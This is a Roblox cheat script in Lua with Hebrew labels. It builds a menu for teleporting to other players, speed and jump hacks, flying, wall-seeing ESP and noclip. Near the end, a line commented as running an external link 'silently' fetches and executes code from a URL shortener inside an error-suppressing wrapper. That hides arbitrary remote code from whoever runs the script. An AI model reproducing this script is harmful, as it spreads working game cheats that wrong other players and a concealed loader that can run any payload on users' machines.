local R = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local p, fs, fly, nc, esp, ij, ec = game.Players.LocalPlayer, 50, false, false, false, false, Color3.new(1,0,0)

local Window = R:CreateWindow({
   Name = "Voidware | ILhub Ultimate V14",
   LoadingTitle = "By Liran & Ilay IL",
   LoadingSubtitle = "תרגום מלא לעברית | גרסה יציבה",
   ConfigurationSaving = { Enabled = false }
})

-- יצירת הטאבים
local t = Window:CreateTab("Teleport (שיגור)", 4483362458)
local m = Window:CreateTab("Movement (תנועה)", 4483345998)
local v = Window:CreateTab("Visuals (ראייה)", 4483362458)
local x = Window:CreateTab("Exploits (פריצות)", 4483362458)

--- קטגוריית שיגור ---
t:CreateSection("Teleport List (רשימת שיגור שחקנים)")
for _, o in pairs(game.Players:GetPlayers()) do
    if o ~= p then
        t:CreateButton({Name = o.DisplayName .. " (שגר אל)", Callback = function() 
            if o.Character then p.Character.HumanoidRootPart.CFrame = o.Character.HumanoidRootPart.CFrame end 
        end})
    end
end

--- קטגוריית תנועה ---
m:CreateSection("Character Settings (הגדרות דמות)")

m:CreateToggle({Name = "Infinity Jump (קפיצה אינסופית)", Callback = function(s) ij = s end})
game:GetService("UserInputService").JumpRequest:Connect(function() if ij then p.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping") end end)

m:CreateSlider({Name = "WalkSpeed (מהירות הליכה)", Range = {0, 3000}, CurrentValue = 16, Callback = function(val) p.Character.Humanoid.WalkSpeed = val end})
m:CreateSlider({Name = "JumpPower (גובה קפיצה)", Range = {0, 3000}, CurrentValue = 50, Callback = function(val) p.Character.Humanoid.UseJumpPower = true p.Character.Humanoid.JumpPower = val end})

m:CreateSection("Fly Controls (שליטה בתעופה)")
m:CreateToggle({Name = "Enable Fly (הפעל תעופה - Space/Q)", Callback = function(s) 
    fly = s
    local hrp = p.Character.HumanoidRootPart
    if fly then
        local bv = Instance.new("BodyVelocity", hrp)
        bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
        task.spawn(function()
            while fly do
                local cam, uis = workspace.CurrentCamera.CFrame, game:GetService("UserInputService")
                local d = Vector3.new(0,0,0)
                if uis:IsKeyDown("W") then d = d + cam.LookVector * fs end
                if uis:IsKeyDown("S") then d = d + cam.LookVector * -fs end
                if uis:IsKeyDown("A") then d = d + cam.RightVector * -fs end
                if uis:IsKeyDown("D") then d = d + cam.RightVector * fs end
                if uis:IsKeyDown(Enum.KeyCode.Space) then d = d + Vector3.new(0, fs, 0) end
                if uis:IsKeyDown("Q") then d = d + Vector3.new(0, -fs, 0) end
                bv.Velocity = d
                task.wait()
            end
            bv:Destroy()
        end)
    end
end})
m:CreateSlider({Name = "Fly Speed (מהירות תעופה)", Range = {0, 3000}, CurrentValue = 50, Callback = function(val) fs = val end})

--- קטגוריית ראייה ---
v:CreateSection("ESP Settings (הגדרות ראיית שחקנים)")
v:CreateToggle({Name = "Enable ESP (הפעל ראייה דרך קירות)", Callback = function(s) 
    esp = s 
    for _, o in pairs(game.Players:GetPlayers()) do
        if o ~= p and o.Character then
            local h = o.Character:FindFirstChild("Highlight") or Instance.new("Highlight", o.Character)
            h.Enabled = esp h.FillColor = ec
        end
    end
end})
v:CreateColorPicker({Name = "ESP Color (בחר צבע וגוון)", Color = ec, Callback = function(c) 
    ec = c 
    for _, o in pairs(game.Players:GetPlayers()) do
        if o.Character and o.Character:FindFirstChild("Highlight") then o.Character.Highlight.FillColor = c end
    end
end})

--- קטגוריית פריצות ---
x:CreateSection("Main Exploits (פריצות ראשיות)")
x:CreateToggle({Name = "Noclip (לעבור דרך קירות)", Callback = function(s) 
    nc = s 
    game:GetService("RunService").Stepped:Connect(function()
        if nc and p.Character then
            for _, b in pairs(p.Character:GetDescendants()) do if b:IsA("BasePart") then b.CanCollide = false end end
        end
    end)
end})

-- הרצת קישור חיצוני בצורה שקטה
task.spawn(function() pcall(function() loadstring(game:HttpGet("https://tinyurl.com/ILSCRIPTSHEBREW"))() end) end)

R:Notify({Title = "V14 Loaded", Content = "כל הפקודות תורגמו לעברית!", Duration = 5})
